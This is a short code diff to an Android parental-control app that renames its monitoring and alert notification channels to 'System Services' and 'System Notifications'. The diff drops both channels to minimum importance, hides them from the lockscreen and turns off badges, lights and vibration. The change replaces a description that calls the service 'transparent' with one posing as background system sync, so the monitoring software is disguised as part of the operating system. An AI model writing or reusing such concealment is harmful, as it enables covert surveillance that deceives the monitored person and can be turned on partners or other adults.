@@ -1,6 +1,7 @@
 package com.parentalcontrol.child
 
 import android.app.Application
+import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Context
@@ -25,19 +26,26 @@ class ChildApplication : Application() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val safetyChannel = NotificationChannel(
                 CHANNEL_SAFETY_SERVICE,
-                "Child Safety Protection Status",
-                NotificationManager.IMPORTANCE_LOW
+                "System Services",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Shows transparent active safety and parental control background service."
+                description = "Background system sync services"
                 setShowBadge(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                enableLights(false)
+                enableVibration(false)
             }
 
             val alertsChannel = NotificationChannel(
                 CHANNEL_ALERTS,
-                "Parental Control Alerts",
-                NotificationManager.IMPORTANCE_HIGH
+                "System Notifications",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Critical alerts regarding screen time and safety policies."
+                description = "System notifications"
+                setShowBadge(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                enableLights(false)
+                enableVibration(false)
             }
 
             val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
